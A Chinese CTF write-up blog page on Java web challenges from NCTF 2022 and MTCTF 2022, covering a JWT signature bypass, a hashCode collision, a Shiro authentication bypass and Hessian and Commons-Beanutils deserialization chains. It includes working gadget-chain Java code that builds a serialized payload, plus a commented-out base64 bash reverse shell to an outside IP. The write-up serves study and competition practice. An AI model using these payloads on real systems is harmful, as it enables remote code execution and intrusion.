@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>近期比赛的ezJava大杂烩 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="近期比赛的ezJava大杂烩 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/29/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E7%9A%84_ezJava_%E5%A4%A7%E6%9D%82%E7%83%A9/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-29T13:12:44.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>29,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">近期比赛的ezJava大杂烩</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>想吐槽一下Java题的名字，难道想不出其他名字了吗，为什么全是easy、ez，不能朴实一点来个Hard或者是Medium是吧，看的时候人都麻了，然后也突出了近期CTF的情况就是无Java不兄弟！你不出点Java题就不是CTF！写出东方自信，让国外CTF看看国内这盛状！！！（XD</p>
+<h1 id="NCTF-2022-ezJava"><a href="#NCTF-2022-ezJava" class="headerlink" title="NCTF 2022 | ezJava"></a>NCTF 2022 | ezJava</h1><p>考点：unixPrintServiceLookup类的getter调用+Hessian反序列化+JWT CVE-2022-21449<br>这题可以称为是一个套中套题。。。最外层其实完全没必要套一个JWT的CVE，太搞心态了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680073208260-5ddb02e2-4bce-46a3-8ce4-188cb831a71a.png#averageHue=%232a2b27&clientId=ubcefa7ab-2c6e-4&from=paste&height=670&id=u928b3c0e&name=image.png&originHeight=837&originWidth=1629&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1796918&status=done&style=none&taskId=u5a92417d-a499-4d6d-bf02-9881f7b20a2&title=&width=1303.2" alt="image.png"><br>主要逻辑就是这个，前面有个JWT鉴权，外加一个hashcode比较问题，所以我才说是套中套。。。。</p>
+<h2 id="（1）JWT绕过-CVE-2022-21449"><a href="#（1）JWT绕过-CVE-2022-21449" class="headerlink" title="（1）JWT绕过-CVE-2022-21449"></a>（1）JWT绕过-CVE-2022-21449</h2><p>其实考的也不是标题中的CVE，这个漏洞需要在jdk15以上才能触发，所以出题人淘了一个差不多的（这不是密码知识吗。）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680073504509-39103e8e-f337-4660-a452-633ffe0f0d45.png#averageHue=%23d1cfcd&clientId=ubcefa7ab-2c6e-4&from=paste&height=163&id=u9ece7699&name=image.png&originHeight=204&originWidth=1975&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90898&status=done&style=none&taskId=u9bec00f9-d2fb-402e-88f7-c9bab22e848&title=&width=1580" alt="image.png"><br>我都无语了…..在这一段代码里的r和q没有进行校验<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680073552247-8f74b38e-3f6f-4095-9571-80f4280d5aab.png#averageHue=%232d2c27&clientId=ubcefa7ab-2c6e-4&from=paste&height=326&id=ud07e5224&name=image.png&originHeight=408&originWidth=1143&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=650077&status=done&style=none&taskId=u6db9a835-0269-460f-9f01-34af1864267&title=&width=914.4" alt="image.png"><br>因此可以进行绕过，这里直接给出伪造的JWT<code>eyJBbGliYW5hbmEiOiJXZWxDb21lVG9NYlRGMjAyMiIsImlzcyI6IlB1cGkxIn0=.1.0</code>，后面两个1、0就是绕过的关键了</p>
+<h2 id="（2）hashcode绕过"><a href="#（2）hashcode绕过" class="headerlink" title="（2）hashcode绕过"></a>（2）hashcode绕过</h2><p>然后还涉及一个hashcode绕过的小技巧，上述伪造JWT明文为<code>WelComeToMbTF2022</code><br>然后题目要求为<code>WelComeToNCTF2022</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680073800777-a288f89e-d296-412a-8d83-35b8edee2dfa.png#averageHue=%232a2a25&clientId=u6189a190-4b01-4&from=paste&height=310&id=u2aa98d94&name=image.png&originHeight=388&originWidth=952&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=538754&status=done&style=none&taskId=ua51b0c3f-3e0e-4184-ae67-ed7a3d1f554&title=&width=761.6" alt="image.png"><br>那为什么这两位的hashcode是相同的呢？<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680073813629-45dd9ac4-e9dc-4c31-8e0b-042e420532a0.png#averageHue=%23282925&clientId=u6189a190-4b01-4&from=paste&height=882&id=u4bd5238d&name=image.png&originHeight=1103&originWidth=2146&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3026823&status=done&style=none&taskId=u3328f778-4941-486c-9f23-885ac498218&title=&width=1716.8" alt="image.png"><br>我们观察一下hashcode的源码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680073820431-da341f7d-8187-4541-b017-8c6f9f8e8324.png#averageHue=%232f2f29&clientId=u6189a190-4b01-4&from=paste&height=266&id=u0b57ed0b&name=image.png&originHeight=332&originWidth=878&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=398343&status=done&style=none&taskId=u2907965a-2953-46f8-a578-4a6399d373a&title=&width=702.4" alt="image.png"><br>他的检验方法实际上是很简单的，也就是需要满足一个等式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//97</span><br><span class="line">&quot;a&quot;.hashCode()</span><br><span class="line"> </span><br><span class="line">//97*31+98=3105</span><br><span class="line">&quot;ab&quot;.hahsCode()</span><br><span class="line"> </span><br><span class="line">//3105*31+99=96354</span><br><span class="line">&quot;abc&quot;.hashCode()</span><br></pre></td></tr></table></figure>
+<p>也就是一个反复叠加的hashcode，从左往右开始乘31，然后加上右边的第一个的Ascii码，所以在这道题中假如我们想要伪造<code>NC</code>这两个字符串的hash，那么就需要满足<code>78*31+67=77*31+98</code>，那右边也就是<code>Mb</code>因此得以绕过</p>
+<h2 id="（3）Hessian的toString链"><a href="#（3）Hessian的toString链" class="headerlink" title="（3）Hessian的toString链"></a>（3）Hessian的toString链</h2><p>其实有个地方之前做Hessian反序列化的时候没注意，回顾一下，当时是触发hashcode打ROME链，既然会调用到hashmap的put方法，那就可能调用toString，因为put方法里面是有一个equals的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680074854587-b7716d25-c7ad-49d8-b12c-c889f8fecd04.png#averageHue=%232d2d29&clientId=ubaa679c6-0ba6-4&from=paste&height=686&id=u018ff264&name=image.png&originHeight=686&originWidth=1263&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1206339&status=done&style=none&taskId=u2a594c8f-d6fe-4523-b409-5c67ca178be&title=&width=1263" alt="image.png"><br>我们可以让左边是一个Xstring来触发toString方法，假如可以走到toString配合，观察依赖包可以发现一个fastjson<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680074967021-2744eb21-69ab-41f0-896b-ef487b210676.png#averageHue=%23383b37&clientId=ubaa679c6-0ba6-4&from=paste&height=206&id=uffe0a7dd&name=image.png&originHeight=206&originWidth=458&originalType=binary&ratio=1&rotation=0&showTitle=false&size=146920&status=done&style=none&taskId=uabd17d16-7696-408e-8457-f4d55007064&title=&width=458" alt="image.png"><br>这一点不陌生，可以进行一个任意getter、setter调用，正常来说肯定选择TempaltesImpl，但是之前说到了，在Hessian反序列化过程中由于不会调用目标类重写的readObject所以TempaltesImpl有一个属性不可反序列化<br>那在这里我就想到2个思路</p>
+<ul>
+<li>SignObject二次反序列化</li>
+<li>Y4佬之前说过的unixPrintServiceLookup</li>
+</ul>
+<h2 id="（4）失败的尝试"><a href="#（4）失败的尝试" class="headerlink" title="（4）失败的尝试"></a>（4）失败的尝试</h2><p>上面2个类都有get方法能让链子走下去，那现在先试试第一条<br>这个在我构造payload的时候发现一个问题，没有CC链的依赖怎么可以去触发二次反序列化呢。。。。我们手动加一个QWQ<br>最后还是以失败告终，但是思路是没问题的，这是Hessian的版本太高了，在高版本的Hessian是会设置whitelist来抵御攻击的<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680076147976-c855bcd5-191d-4cc3-baef-a249e47f2c40.png#averageHue=%23282a28&clientId=ubaa679c6-0ba6-4&from=paste&height=967&id=u71f0a875&name=image.png&originHeight=967&originWidth=1998&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2584550&status=done&style=none&taskId=u705fbca4-f69e-4045-b840-9b1f0ee26c5&title=&width=1998" alt="image.png"><br>由于signObject不在whitelist里面所以最后会抛出一个异常。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680076178278-faddfd00-0c9c-465a-9edc-c75953d8fe4c.png#averageHue=%23232522&clientId=ubaa679c6-0ba6-4&from=paste&height=226&id=u00add7a6&name=image.png&originHeight=226&originWidth=1114&originalType=binary&ratio=1&rotation=0&showTitle=false&size=383516&status=done&style=none&taskId=uc8a88231-7deb-47b6-b3bd-834d863883a&title=&width=1114" alt="image.png"></p>
+<h2 id="（5）正解"><a href="#（5）正解" class="headerlink" title="（5）正解"></a>（5）正解</h2><p>那么正解就是Y4佬和官方WP中使用的一个类<code>unixPrintServiceLookup</code>（这个类只在Linux系统的JDK中存在Windows不存在，因此接下来不会写的太详细，太复杂了）<br>这个类存在很多get方法，而且这些get方法中全是命令执行点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680076281804-5347b15f-52fa-4c11-a719-063e52ebec9f.png#averageHue=%232e2d2c&clientId=ubaa679c6-0ba6-4&from=paste&id=u70daf506&name=image.png&originHeight=958&originWidth=1280&originalType=url&ratio=1&rotation=0&showTitle=false&size=350381&status=done&style=none&taskId=ufadedcdf-47eb-4635-b6e0-07827a51613&title=" alt="image.png"><br>参考：<a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/e5b532ae56eda36be2f04a007">https://xie.infoq.cn/article/e5b532ae56eda36be2f04a007</a><br>这一篇文章中有比较详细的调用顺序分析，这里帖出首和尾<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680076368825-442e3601-04ce-46bb-8613-3b9a8a7734f4.png#averageHue=%232d2e2d&clientId=ubaa679c6-0ba6-4&from=paste&id=u28411398&name=image.png&originHeight=538&originWidth=688&originalType=url&ratio=1&rotation=0&showTitle=false&size=123014&status=done&style=none&taskId=u77734d20-7cfd-4e52-9776-a3f26e94241&title=" alt="image.png"><br>最后在execCmd执行命令<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680076381670-73c43dcb-6379-4d3a-937c-eb38bc5d225c.png#averageHue=%232d2e2d&clientId=ubaa679c6-0ba6-4&from=paste&id=ud6381a61&name=image.png&originHeight=534&originWidth=786&originalType=url&ratio=1&rotation=0&showTitle=false&size=113642&status=done&style=none&taskId=u497b77f4-560e-468b-bb24-e96e1418048&title=" alt="image.png"><br>var2可控，可以反射修改。结束</p>
+<h1 id="MTCTF-2022-ezJava"><a href="#MTCTF-2022-ezJava" class="headerlink" title="MTCTF 2022 | ezJava"></a>MTCTF 2022 | ezJava</h1><p>考点：shiro鉴权绕过、Java CB链<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680006833299-9e4f6ab6-f9a2-4310-9565-70f8c72cec52.png#averageHue=%232b2c28&clientId=u9ef571b5-8c48-4&from=paste&height=616&id=ue3981a36&name=image.png&originHeight=770&originWidth=1549&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1621637&status=done&style=none&taskId=u2c3cc102-1168-4abd-98ae-aea5228a59a&title=&width=1239.2" alt="image.png"><br>审计的话倒是很明显就是在admin&#x2F;hello路由下进行了反序列化，但是首先得进行一个Shiro鉴权<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680006890068-f2976b5e-3f0d-4199-97bb-172f85d9fd09.png#averageHue=%2330322d&clientId=u9ef571b5-8c48-4&from=paste&height=252&id=u2a548236&name=image.png&originHeight=315&originWidth=1297&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=585086&status=done&style=none&taskId=u7b259372-bf03-44ad-b8b0-d7b573f8650&title=&width=1037.6" alt="image.png"><br>这里就涉及一个Shiro鉴权绕过了，经过检索发现了<br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1592/#toc_0x05-cve-2020-11989">https://tttang.com/archive/1592/#toc_0x05-cve-2020-11989</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680006979273-ada7e2b3-6923-4b26-b021-dfa879dfd080.png#averageHue=%23fcfbfb&clientId=u9ef571b5-8c48-4&from=paste&height=423&id=ub34b0884&name=image.png&originHeight=529&originWidth=1109&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=71937&status=done&style=none&taskId=ufc08bf46-01fd-489f-bc19-3b8f489b1a6&title=&width=887.2" alt="image.png"><br>经过测试可以成功绕过权限认证<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680007012239-c42cab7a-69a4-430b-b52e-6bd0dcbc4bbc.png#averageHue=%23e4e4e4&clientId=u9ef571b5-8c48-4&from=paste&height=226&id=u0f70e9f5&name=image.png&originHeight=283&originWidth=1676&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8586&status=done&style=none&taskId=uc3e3591e-90c7-465a-a7e0-7a365d65abc&title=&width=1340.8" alt="image.png"><br>然后看一下过滤了些什么类：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680007023425-038108e2-e7b3-4acd-9375-586c95cf8e51.png#averageHue=%232c2b25&clientId=u9ef571b5-8c48-4&from=paste&height=146&id=uc1b903ed&name=image.png&originHeight=183&originWidth=822&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=215094&status=done&style=none&taskId=uc71132fb-0855-46df-b94f-468bb4c485e&title=&width=657.6" alt="image.png"><br>这里出题者有个失误，就是断点处<code>com.sun.org.apache.xalan.internal.xsltc.traxTemplatesImpl</code>应该是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，他漏掉了一个<code>.</code>,因此我们可以很自然的用CB链打<br>解决一个疑惑<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680007086367-b981ca71-6de6-4152-aca9-d34ed899c65f.png#averageHue=%232f302c&clientId=u9ef571b5-8c48-4&from=paste&height=57&id=u2a5044cf&name=image.png&originHeight=71&originWidth=399&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41925&status=done&style=none&taskId=u287d3dcd-0327-4b52-b3ef-1ca1c663a8f&title=&width=319.2" alt="image.png"><br>看依赖乍看是有cc链依赖的，为什么不用cc链打呢。注意下版本是3.2.2，不是3.2.1，进行了修复，无法反序列化，测试你会发现如下报错<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680007125192-bae6b475-0c9f-48b0-996f-d9c13cc93b28.png#averageHue=%231f211f&clientId=u9ef571b5-8c48-4&from=paste&height=238&id=u24ac0f23&name=image.png&originHeight=298&originWidth=2444&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1023948&status=done&style=none&taskId=u16a6ce23-f7e0-4901-866f-ac392892bb7&title=&width=1955.2" alt="image.png"><br>不给你反序列化了，因此用CB链打</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMjQuMjM1LjE3Ni84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);</span></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        Base64Encode(barr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680007525327-71fb81fc-8aa7-4667-85e4-52b6c95b2d30.png#averageHue=%23dccd9c&clientId=u9ef571b5-8c48-4&from=paste&height=1091&id=u93f3b042&name=image.png&originHeight=1364&originWidth=2519&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=332184&status=done&style=none&taskId=ud175ae39-ee26-4838-87a1-220adab695b&title=&width=2015.2" alt="image.png"><br>有关非预期，和其他师傅讨论了一下，看到依赖有hibernate依赖，可以考虑一手hibernate触发RMI的二次反序列化，但是卡在了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680007597391-75fb158c-9e52-4239-80da-a1d39f1ca87a.png#averageHue=%2330342b&clientId=u9ef571b5-8c48-4&from=paste&height=27&id=ua2ccc5f6&name=image.png&originHeight=34&originWidth=678&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40771&status=done&style=none&taskId=uad064c69-f978-43cc-b0d5-84c710e6059&title=&width=542.4" alt="image.png"><br>需要想办法绕过这个方法寻找替代品，假如有思路了会补上的</p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>预期解来了，假如ban了Tempatesimpl我们可以另类去触发JNDI，详细参考</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680095491582-0db2ddb8-be82-4d16-b30e-7f01b8d44f6f.png" alt="img"></p>
